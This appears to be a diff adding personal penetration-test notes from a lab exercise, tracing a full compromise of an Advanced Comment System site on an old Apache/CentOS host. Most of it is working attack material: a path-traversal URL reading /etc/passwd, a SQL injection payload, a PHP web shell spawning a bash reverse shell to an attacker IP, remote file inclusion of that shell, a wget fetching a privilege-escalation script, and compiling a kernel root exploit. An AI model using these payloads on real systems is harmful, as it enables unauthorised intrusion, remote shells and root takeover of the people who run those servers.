@@ -1,0 +1,47 @@
+# 1 directories enumeration
+/index.html
+/internal
+/manual
+/robots.txt
+
+# 2 found framework info
+Apache HTTP Server Version 2.0.52
+
+# 3 found possible vulnerable
+advanced comment system 
+Advanced Comment System 1.0 - 'ACS_path' Path Traversal			| php/webapps/49343.txt
+Advanced Comment System 1.0 - Multiple Remote File Inclusions	| php/webapps/9623.txt
+Advanced Comment System 1.0 - SQL Injection 					| php/webapps/45853.txt
+
+# 4 LFI found
+http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+
+# 5 found hidden login page
+http://$IP/internal/advanced_comment_system/admin.php?pw=
+pwd: admin
+
+# 6 found user
+name: ryujin
+msg: holaz
+
+# 7 SQLi
+http://$IP/internal/advanced_comment_system/admin.php?pw=admin&page=/internal/index.php%27%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x71717a6b71,0x67424663534f77556d44746a59686f78427354754268636b5466486249616b724d716e4869634758,0x7171626a71),NULL--%20SkrU&del=2
+qqzkqgBFcSOwUmDtjYhoxBsTuBhckTfHbIakrMqnHicGXqqbjq
+
+# 8 make shell.php
+<?php echo shell_exec("bash -i >& /dev/tcp/192.168.119.194/80 0>&1");?>
+
+# 9 exploit RFI
+# exp1: using port 80 or 443 to host files as the target has firewall setup to only vistor those two ports
+# exp2: add null byte at the end of the url
+http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://192.168.119.194:443/shell.php%00
+
+# 10 PE
+wget http://192.168.119.194:443/linpeas.sh
+
+# 11 found kernal version and exploit
+Linux Kernel 2.6.9-89.EL
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 | linux_x86/local/9542.c
+
+# 12 complie
+gcc -m32 -Wl,--hash-style=both 9542.c
